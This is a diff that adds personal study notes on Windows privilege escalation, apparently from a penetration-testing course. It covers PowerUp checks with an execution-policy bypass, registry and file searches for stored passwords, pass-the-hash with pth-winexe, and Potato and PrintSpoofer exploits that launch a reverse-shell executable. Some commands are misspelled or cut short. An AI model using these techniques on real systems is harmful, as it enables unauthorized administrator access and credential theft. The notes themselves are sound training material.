@@ -1,0 +1,83 @@
+Notes
+
+1. Intro
+2. Lab Setup
+3. Privilege Escalation in Windows
+4. Spawning Administrator Shells
+5. Privilege Escalation Tools
+6. Kernel Exploits
+7. Service Exploits
+8. Registry Exploits
+9. Passwords
+10. Scheduled Tasks
+11. Insecure GUI apps
+12. Startup Apps
+13. Installed Apps
+14. Hot Potato
+15. Token Impersonation
+16. Port Forwarding
+17. Privilege Escalation Strategy
+18. getsystem (Named Pipes & Token Duplication)
+19. User Privileges
+=============================================
+
+Notes
+
+5. Powerup
+C:\> powershell -exec bypass
+PS> .\Powerup.ps1
+PS> Invoke-AllChecks
+.....
+
+
+6. secwiki kernel exploit
+search windows version from systeminfo commands
+
+
+7.insecure service properties
+unquoted service path
+weak registry permissions
+insecure service executables
+dll hijacking
+
+8.for AlwaysInstallElevated, have to check 2 registry settings must be enabled for this to work.
+“AlwayInstallElevated” value must be set to 1 for both the local machine and current user
+HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+
+9. reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+winexe
+> dir /s *pass* == *.config
+> finstr /si password *.xml *.ini *.txt
+
+If we managed to find LM or NTLM hash on windows, either crack it or pass the hash
+pth-winexe -U 'admin%aad3b.........:a9fd........' //192.168.1.22 cmd.exe
+pth-winexe --system -U 'admin%aad3b.........:a9fd........' //192.168.1.22 cmd.exe
+
+
+10. schtasks /query /fo LIST /v
+PS> Get-ScheduledTask | where {$_.TaskPath -notlike “\Microsoft*”} | ft TaskName,TaskPath,State
+
+13.Enumerate all running services
+tasklist /V
+.\seatbelt.exe NonstandardProcesses
+winpeas.exe quiet procesinfo
+
+14. .\potato.exe -ip 192.168.1.1 -cmd “C:\Privesc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
+
+
+15. whoami /priv
+Seimpersonate token
+> C:\Privesc\JuicyPotato.exe -l 1337 -p C:\Privesc\reverse.exe -t * -c {03ca......CSLID.........}
+
+Rogue Potato
+latest of the “Potato” exploit
+
+PrintSpoofer exploit
+requires vc_redist.x64.exe to run this exploit
+> .\vc_redist.x64.exe to install
+> C:\privesc\PrintSpoofer.exe -i -c “C:\Privesc\reverse.exe”
+
+19.
